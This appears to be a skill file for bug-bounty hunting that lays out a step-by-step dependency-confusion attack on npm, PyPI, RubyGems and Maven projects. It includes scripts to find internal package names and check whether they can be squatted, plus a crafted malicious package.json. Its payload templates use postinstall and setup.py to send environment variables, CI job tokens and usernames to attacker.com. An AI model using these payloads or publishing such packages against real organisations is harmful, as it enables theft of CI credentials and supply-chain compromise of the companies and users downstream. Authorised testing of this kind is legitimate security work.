---
name: hunt-dependency-confusion
description: Hunt Dependency Confusion — supply chain substitution, NPM/Pip/Gem/Maven package squatting, private vs public registry conflict, Dockerfile analysis. High when chained to CI/CD compromise. Use when analyzing package.json, requirements.txt, Gemfile, pom.xml, or Dockerfile.
sources: hackerone_public
---

# HUNT-DEPENDENCY-CONFUSION — Dependency Confusion / Supply Chain

## Crown Jewel Targets

Dependency confusion is Critical when an attacker can publish a public package that gets installed inside the target's internal network.

- **Internal-only package names** — packages that exist on private registries but not on public registries
- **CI/CD pipelines** — automated installs that don't lock registry sources
- **Monorepos** — many internal packages, high likelihood of at least one being squattable
- **Dockerfile builds** — multi-stage builds fetching from public registries

## Attack Surface Signals

```
package.json with scoped internal packages (@company/internal-lib)
requirements.txt with packages that could exist on PyPI
Gemfile with internal gems
pom.xml with internal groupIds
Dockerfile fetching from both private and public registries
```

## Step-by-Step Hunting Methodology

### Phase 1 — Discover Internal Package Names

```bash
# Find all dependency files
find . -name "package.json" -o -name "requirements.txt" -o -name "Gemfile" -o -name "pom.xml" -o -name "go.mod" | while read f; do
  case "$f" in
    *package.json) jq -r '.dependencies // {} | keys[]' "$f" 2>/dev/null;;
    *requirements.txt) grep -v '^#' "$f" | cut -d= -f1;;
    *Gemfile) grep -E "^[[:space:]]*gem" "$f" | awk '{print $2}' | tr -d "'\"";;
    *pom.xml) grep -E "<groupId>" "$f" | head -20;;
    *go.mod) grep -v "^#" "$f" | grep -E "^[[:space:]]*[a-z]" | awk '{print $1}';;
  esac
done
```

### Phase 2 — Check Public Registry Availability

```bash
# Check NPM
pkg="@company/internal-lib"
if curl -sf "https://registry.npmjs.org/$pkg" > /dev/null 2>&1; then
  echo "EXISTS on NPM"
else
  echo "AVAILABLE for squatting on NPM"
fi

# Check PyPI
pip index versions "$pkg" 2>/dev/null || echo "AVAILABLE on PyPI"

# Check RubyGems
gem search "^$pkg$" 2>/dev/null | grep -q "$pkg" && echo "EXISTS" || echo "AVAILABLE on RubyGems"
```

### Phase 3 — Craft Malicious Package

Create a minimal package with the same name as the internal package, containing a postinstall script:

```javascript
// package.json
{
  "name": "@company/internal-lib",
  "version": "99.0.0",
  "description": "Automatic fix",
  "scripts": {
    "postinstall": "curl -s http://attacker.com/$(env | base64)"
  }
}
```

### Phase 4 — Verify Resolution

```bash
# Does the build process try to fetch from the public registry first?
# Check .npmrc, .piprc, bundle config for registry overrides
```

## Payload Templates

```javascript
// NPM postinstall exfil
"postinstall": "node -e 'require(\"http\").get(\"http://attacker.com/\"+process.env.CI_JOB_TOKEN)'"

// Python setup.py
import os; os.system("curl http://attacker.com/$(whoami)")
```

## Common Root Causes

- Internal packages are never published publicly, making names available for squatting
- Default registry configuration fetches from public registries before private ones
- Scoped packages (`@company/pkg`) can still be squatted if the org scope is claimed
- CI tokens often have broad access and are exposed in environment variables

## Gate 0 Validation

- [ ] Have I found at least one package name not registered on the public registry?
- [ ] Is the package auto-installed in CI/CD or Docker build?
- [ ] Have I verified the package manager resolves to the public registry first?
